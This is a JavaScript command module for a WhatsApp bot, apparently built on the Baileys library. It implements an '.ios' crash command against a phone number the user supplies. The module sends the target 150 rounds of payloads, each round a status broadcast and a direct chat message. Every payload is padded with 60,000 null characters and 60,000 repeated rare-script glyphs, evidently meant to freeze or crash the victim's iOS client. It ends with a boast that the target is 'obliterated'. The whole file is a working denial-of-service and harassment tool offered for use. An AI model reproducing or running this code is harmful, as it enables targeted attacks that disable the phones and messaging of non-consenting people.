'use strict';
const { MadaraEye } = require('../../lib/madaraEye');
const { createProgressBar } = require('../../lib/progressBar');

module.exports = {
    name: 'ios',
    aliases: ['ioscrash', 'iosforce'],
    category: 'madaraeye',
    desc: 'ɪᴏs ɪɴᴠɪsɪʙʟᴇ ғᴏʀᴄᴇ — sᴛᴀᴛᴜs + ᴄʜᴀᴛ ᴅᴏᴜʙʟᴇ ᴀᴛᴛᴀᴄᴋ',
    usage: '.ios <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        
        if (!args[0]) {
            return sock.sendMessage(ctx.from, { 
                text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}ios <number>\n📝 *Example:* ${prefix}ios 2348012345678` 
            }, { quoted: msg });
        }
        
        const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        let eye = global.getMadaraEye?.(sock);
        if (!eye) {
            eye = new MadaraEye(sock);
        }
        
        const TOTAL = 150;
        const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
        
        const pad = "\u0000".repeat(60000);
        const rep = "𑇂𑆵𑆴𑆿".repeat(60000);
        const massiveText = `⎋𝐑𝐈𝐙𝐗𝐕𝐄𝐋𝐙-‣꙱\n${pad}${rep}`;
        
        try {
            for (let i = 0; i < TOTAL; i++) {
                // ── Attack 1: Status broadcast (appears as status update) ──
                const msgPayload = {
                    message: {
                        locationMessage: {
                            degreesLatitude: 21.1266,
                            degreesLongitude: -11.8199,
                            name: `⎋𝐑𝐈𝐙𝐗𝐕𝐄𝐋𝐙-‣꙱\n${pad}${rep}`,
                            url: "https://t.me/rizxvelzdev",
                            contextInfo: {
                                externalAdReply: {
                                    quotedAd: {
                                        advertiserName: rep.substring(0, 100),
                                        mediaType: "IMAGE",
                                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                                        caption: "@MADARA_EYE" + rep.substring(0, 500)
                                    },
                                    placeholderKey: {
                                        remoteJid: "0s.whatsapp.net",
                                        fromMe: false,
                                        id: "ABCDEF1234567890"
                                    }
                                }
                            }
                        }
                    }
                };
                
                await sock.relayMessage("status@broadcast", msgPayload.message, {
                    messageId: `${Date.now()}_${i}`,
                    statusJidList: [target],
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: {},
                            content: [
                                {
                                    tag: "mentioned_users",
                                    attrs: {},
                                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                                }
                            ]
                        }
                    ]
                }).catch(() => {});
                
                // ── Attack 2: Direct chat message simultaneously ─────────
                await sock.sendMessage(target, {
                    text: massiveText,
                    contextInfo: {
                        mentionedJid: [target],
                        externalAdReply: {
                            title: rep.substring(0, 200),
                            body: pad.substring(0, 500),
                            thumbnailUrl: '',
                            mediaType: 1,
                            renderLargerThumbnail: false,
                        }
                    }
                }).catch(() => {});
                
                await bar.update(1, 'ɪᴏs ᴅᴏᴜʙʟᴇ ᴀᴛᴛᴀᴄᴋ');
                if (i % 10 === 0) await new Promise(r => setTimeout(r, 100));
            }
            
            await bar.done(`✅ ɪᴏs ᴅᴏᴜʙʟᴇ ᴀᴛᴛᴀᴄᴋ ᴄᴏᴍᴘʟᴇᴛᴇ\n💀 ᴛᴀʀɢᴇᴛ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL * 2}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
        } catch (e) {
            await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`);
        }
    }
};